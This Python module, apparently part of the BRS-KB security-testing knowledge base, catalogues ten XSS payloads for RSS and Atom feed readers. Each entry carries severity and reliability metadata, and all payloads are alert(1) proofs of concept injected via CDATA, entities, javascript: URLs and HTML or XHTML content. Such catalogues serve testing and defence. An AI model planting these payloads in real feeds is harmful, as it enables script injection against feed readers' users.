#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

RSS/Atom Feed XSS Payloads
XSS in feed readers and aggregators
"""

from ..models import PayloadEntry


RSS_ATOM_DATABASE = {
    # ===== RSS TITLE XSS =====
    "rss_title_001": PayloadEntry(
        payload="<item><title><![CDATA[<script>alert(1)</script>]]></title></item>",
        contexts=["xml", "html_content"],
        tags=["rss", "feed", "cdata"],
        severity="high",
        cvss_score=7.5,
        description="RSS title CDATA XSS",
        reliability="medium",
    ),
    "rss_title_002": PayloadEntry(
        payload="<item><title>&lt;script&gt;alert(1)&lt;/script&gt;</title></item>",
        contexts=["xml", "html_content"],
        tags=["rss", "feed", "entity"],
        severity="high",
        cvss_score=7.5,
        description="RSS title entity XSS",
        reliability="medium",
    ),
    # ===== RSS DESCRIPTION XSS =====
    "rss_desc_001": PayloadEntry(
        payload="<item><description><![CDATA[<img src=x onerror=alert(1)>]]></description></item>",
        contexts=["xml", "html_content"],
        tags=["rss", "feed", "description"],
        severity="high",
        cvss_score=7.5,
        description="RSS description XSS",
        reliability="high",
    ),
    # ===== RSS LINK XSS =====
    "rss_link_001": PayloadEntry(
        payload="<item><link>javascript:alert(1)</link></item>",
        contexts=["xml", "href"],
        tags=["rss", "feed", "link"],
        severity="high",
        cvss_score=7.5,
        description="RSS link javascript",
        reliability="medium",
    ),
    # ===== ATOM CONTENT XSS =====
    "atom_content_001": PayloadEntry(
        payload='<entry><content type="html"><![CDATA[<script>alert(1)</script>]]></content></entry>',
        contexts=["xml", "html_content"],
        tags=["atom", "feed", "content"],
        severity="high",
        cvss_score=7.5,
        description="Atom content HTML XSS",
        reliability="high",
    ),
    "atom_content_002": PayloadEntry(
        payload='<entry><content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></content></entry>',
        contexts=["xml", "html_content"],
        tags=["atom", "feed", "xhtml"],
        severity="high",
        cvss_score=7.5,
        description="Atom XHTML content XSS",
        reliability="high",
    ),
    # ===== ATOM SUMMARY XSS =====
    "atom_summary_001": PayloadEntry(
        payload='<entry><summary type="html"><img src=x onerror=alert(1)></summary></entry>',
        contexts=["xml", "html_content"],
        tags=["atom", "feed", "summary"],
        severity="high",
        cvss_score=7.5,
        description="Atom summary XSS",
        reliability="high",
    ),
    # ===== RSS AUTHOR XSS =====
    "rss_author_001": PayloadEntry(
        payload='<item><author><![CDATA["><script>alert(1)</script>]]></author></item>',
        contexts=["xml", "html_content"],
        tags=["rss", "feed", "author"],
        severity="high",
        cvss_score=7.5,
        description="RSS author XSS",
        reliability="medium",
    ),
    # ===== RSS CATEGORY XSS =====
    "rss_category_001": PayloadEntry(
        payload="<item><category><![CDATA[<img src=x onerror=alert(1)>]]></category></item>",
        contexts=["xml", "html_content"],
        tags=["rss", "feed", "category"],
        severity="high",
        cvss_score=7.5,
        description="RSS category XSS",
        reliability="medium",
    ),
    # ===== RSS ENCLOSURE XSS =====
    "rss_enclosure_001": PayloadEntry(
        payload='<item><enclosure url="javascript:alert(1)" type="audio/mpeg"/></item>',
        contexts=["xml", "url"],
        tags=["rss", "feed", "enclosure"],
        severity="high",
        cvss_score=7.5,
        description="RSS enclosure URL XSS",
        reliability="low",
    ),
}

RSS_ATOM_TOTAL = len(RSS_ATOM_DATABASE)
